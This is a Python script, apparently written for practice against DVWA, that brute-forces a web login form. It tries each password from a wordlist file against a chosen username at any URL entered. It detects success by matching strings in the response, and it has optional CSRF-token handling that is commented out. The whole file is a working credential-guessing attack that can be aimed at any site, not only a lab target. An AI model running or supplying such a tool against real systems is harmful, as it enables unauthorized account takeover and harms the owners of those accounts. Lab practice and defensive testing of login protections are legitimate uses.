import requests
from bs4 import BeautifulSoup

url = input("Enter url to scan:")  # 🔁 Replace with your URL (DVWA or your own)
username = input("Enter username to brute force:")  # 🔁 Replace with your target username
password_file = "passwords.txt"

def get_csrf_token(session, login_url):
    """Fetch CSRF token from DVWA login form."""
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})
    return token["value"] if token else None

def brute_force_login(url, username, wordlist_path):
    session = requests.Session()

    with open(wordlist_path, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"[ ] Trying: {username}:{password}")

            # Try custom site login (no CSRF)
            custom_response = session.post(url, data={
                "username": username,
                "password": password,
                "login": "Login"
            })

            if "Login Successful" in custom_response.text or "Welcome" in custom_response.text:
                print(f"[+] SUCCESS (Custom site): {username}:{password}")
                return

            # Try DVWA login with CSRF token
            #token = get_csrf_token(session, url)
            #if not token:
            #    print("[-] Failed to get CSRF token")
            #    continue

            dvwa_data = {
                "username": username,
                "password": password,
                "Login": "Login",
                #"user_token": token
            }

            response = session.post(url, data=dvwa_data)

            if "Welcome to the password protected area" in response.text or "You have logged in as" in response.text:
                print(f"[+] SUCCESS (DVWA): {username}:{password}")
                return

    print("[-] No valid password found.")

if __name__ == "__main__":
    brute_force_login(url, username, password_file)
